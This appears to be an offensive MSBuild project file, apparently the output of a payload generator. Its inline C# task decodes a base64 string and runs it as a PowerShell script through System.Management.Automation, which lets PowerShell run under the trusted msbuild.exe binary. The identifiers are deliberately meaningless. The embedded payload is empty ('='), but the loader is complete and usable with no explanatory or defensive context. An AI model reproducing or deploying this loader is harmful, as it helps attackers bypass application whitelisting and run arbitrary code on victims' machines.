<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="ptlfdcsharp">
   <ptlfd />
  </Target>
  <UsingTask
    TaskName="ptlfd"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

          using System;
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;

      public class ptlfd : Task, ITask
        {
            public override bool Execute()
            {
              string zSRLYVLTO = "=";

                PowerShell PxeOwe = PowerShell.Create();
                PxeOwe.AddScript(jhNgBHsRBf(zSRLYVLTO));

                Collection<PSObject> bpiskmb = null;
                try
                {
                    bpiskmb = PxeOwe.Invoke();
                }
                catch(Exception e)
                {
                    Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
                }
                if (bpiskmb != null)
                {
                    foreach (PSObject APcwVakQ in bpiskmb)
                    {
                        Console.WriteLine(APcwVakQ.ToString());
                    }
                }
                return true;
            }

            public static string fOTakjeazf(string text) {
           return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
        }

        public static string jhNgBHsRBf(string encodedtext) {
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
        }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>